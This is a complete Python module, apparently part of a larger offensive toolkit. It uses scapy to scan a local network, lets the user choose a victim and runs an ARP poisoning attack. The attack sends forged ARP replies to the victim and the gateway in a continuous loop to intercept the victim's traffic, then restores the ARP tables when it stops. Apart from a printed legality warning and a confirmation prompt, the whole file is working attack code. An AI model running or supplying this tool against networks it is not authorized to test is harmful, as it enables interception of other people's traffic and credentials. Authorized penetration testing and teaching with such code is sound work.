# modules/arppoisoning.py

import os
import sys
import time
from scapy.all import ARP, Ether, srp, send, conf, get_if_addr

def get_network_info():
    """
    Automatically determines gateway IP and network range, with user override.
    """
    try:
        gateway_ip = conf.route.route("0.0.0.0")[2]
        local_ip = get_if_addr(conf.iface)
        ip_range_auto = gateway_ip.rsplit('.', 1)[0] + '.0/24'
        print(f"[*] Gateway found: {gateway_ip}")
        print(f"[*] Local IP address: {local_ip}")
        print(f"[*] Auto-detected Network Range: {ip_range_auto}")
        
        confirm_range = input("Is this network range correct? [Y/n]: ").lower().strip()
        if confirm_range == 'n':
            ip_range = input("Please enter the correct network range (e.g., 192.168.1.0/24): ")
        else:
            ip_range = ip_range_auto
            
        print(f"[*] Using Network Range: {ip_range}")
        return gateway_ip, local_ip, ip_range
    except Exception as e:
        # Future Improvement: Catch more specific exceptions here (e.g., socket errors).
        print(f"[!] Error: Could not determine network info. Please check your connection. Details: {e}")
        return None, None, None

def get_devices_on_network(ip_range):
    """Scans the network to find devices and their MAC addresses."""
    print(f"[*] Scanning for devices in {ip_range}...")
    try:
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        devices = [{'ip': r.psrc, 'mac': r.hwsrc} for s, r in answered_list]
        return devices
    except Exception as e:
        print(f"[!] An error occurred during network scan: {e}")
        return []

def display_targets(targets):
    """Prints a list of valid targets for the user to choose from."""
    print("\n--- Available Targets ---")
    if not targets:
        print("No other devices found on the network.")
    else:
        for i, device in enumerate(targets):
            print(f" [{i}] IP: {device['ip']:<15} MAC: {device['mac']}")
    print("-------------------------\n")

def poison(target_ip, target_mac, gateway_ip):
    """Sends ARP poison packets to the target and the gateway."""
    # Note: Gateway MAC is not needed here as we are telling the target
    # that WE are the gateway, using our own MAC address implicitly.
    poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip) # Broadcast to be safe
    print(f"[*] Beginning ARP poison attack on {target_ip}. Press CTRL+C to stop.")
    sent_packets_count = 0
    try:
        while True:
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            sent_packets_count += 2
            sys.stdout.write(f"\r[*] Packets sent: {sent_packets_count}")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP poison attack.")

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restores the ARP tables of the target and gateway by sending correct ARP packets."""
    print("\n[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
    print("[*] Network restored to normal.")

def main():
    if os.geteuid() != 0:
        print("[!] This module requires root privileges. Please run with sudo.")
        sys.exit(1)

    gateway_ip, local_ip, ip_range = get_network_info()
    if not all((gateway_ip, local_ip, ip_range)):
        sys.exit(1)

    all_devices = get_devices_on_network(ip_range)
    # Find the gateway MAC address from our scan results.
    gateway_mac = next((dev['mac'] for dev in all_devices if dev['ip'] == gateway_ip), None)

    if not gateway_mac:
        print("[!] Could not find gateway MAC address. Exiting.")
        sys.exit(1)

    targets = [dev for dev in all_devices if dev['ip'] not in [gateway_ip, local_ip]]
    display_targets(targets)
    if not targets:
        sys.exit(1)
        
    target_device = None
    while True:
        try:
            choice = int(input("Choose a target device number to poison: "))
            if 0 <= choice < len(targets):
                target_device = targets[choice]
                break
            else:
                print("[!] Invalid selection. Please choose a number from the list.")
        except (ValueError, IndexError):
            print("[!] Invalid input. Please enter a valid number.")
        except KeyboardInterrupt:
            print("\n[*] Exiting.")
            sys.exit(0)

    print(f"[*] Selected Target: {target_device['ip']}")
    
    # --- SAFETY CONFIRMATION BLOCK (Excellent Practice) ---
    print("\n" + "="*60)
    print("  [!] WARNING: You are about to perform an ARP poison attack.")
    print("  This will intercept and redirect traffic for the target.")
    print("  This is illegal without explicit authorization.")
    print("="*60)
    confirm = input("Are you sure you want to proceed? (Type 'yes' to confirm): ")
    if confirm.lower().strip() != 'yes':
        print("[*] Attack aborted by user.")
        sys.exit(0)

    # --- CRITICAL SAFETY FEATURE: Using a `finally` block ensures restore() is ALWAYS called ---
    try:
        print("[*] Confirmation received. Launching attack...")
        poison(target_device['ip'], target_device['mac'], gateway_ip)
    finally:
        restore(target_device['ip'], target_device['mac'], gateway_ip, gateway_mac)

if __name__ == "__main__":
    main()